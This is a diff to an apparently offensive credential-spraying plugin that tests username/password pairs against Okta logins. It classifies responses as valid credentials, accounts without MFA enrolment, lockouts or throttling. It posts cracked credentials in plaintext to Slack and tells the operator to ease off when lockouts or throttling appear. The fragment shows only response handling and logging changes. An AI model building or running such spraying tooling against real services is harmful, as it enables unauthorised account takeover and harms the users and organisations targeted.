@@ -52,7 +52,7 @@ def okta_authenticate(url, username, password, useragent, pluginargs):
                 data_response['success'] = False
                 data_response['output'] ='FAILED: Locked out {}:{}'.format(username, password)
                 data_response['action'] = 'redirect'
-                utils.slackupdate("Alert: Accounts are being locked out.")
+                utils.slacklog("Alert: Accounts are being locked out. Consider stopping spray")
 
             elif resp_json.get("status") == "SUCCESS":
                 data_response['success'] = True
@@ -73,24 +73,25 @@ def okta_authenticate(url, username, password, useragent, pluginargs):
 
             elif resp_json.get("status") == "MFA_ENROLL":
                 data_response['success'] = True
-                data_response['output'] = "SUCCESS: MFA enrollment required {}:{}".format(username,password)
-                utils.slacknotify(username, password + "\nInfo: MFA IS UNCONFIGURED!")
+                data_response['output'] = utils.prGreen("SUCCESS: MFA enrollment required {}:{}".format(username,password))
+                utils.slacknotify(username, password + "\nInfo: MFA is not configured!")
 
             else:
                 data_response['success'] = False
                 data_response['output'] = utils.prYellow("ALERT: 200 but doesn't indicate success {}:{}".format(username,password))
-                utils.slackupdate("Alert: Somethings weird..")
+                utils.slacklog("Alert: We got a 200 but it is not clear if creds are valid")
+                utils.slacknotify(username, password + "\nInfo: May be valid, proceed with caution!")
 
         elif resp.status_code == 403:
                 data_response['success'] = False
                 data_response['code'] = resp.status_code
                 data_response['output'] = utils.prRed("[!] FAILED THROTTLE INDICATED: {} => {}:{}".format(resp.status_code, username, password))
-                utils.slackupdate("Alert: Throttle Detected..")
+                utils.slacklog("Alert: Throttle Detected, proceed with caution")
 
         else:
             data_response['success'] = False
             data_response['code'] = resp.status_code
-            data_response['output'] = "FAILED: {} => {}:{}".format(resp.status_code, username, password)
+            data_response['output'] = utils.prRed("FAILED: {} => {}:{}".format(resp.status_code, username, password))
 
 
     except Exception as ex:
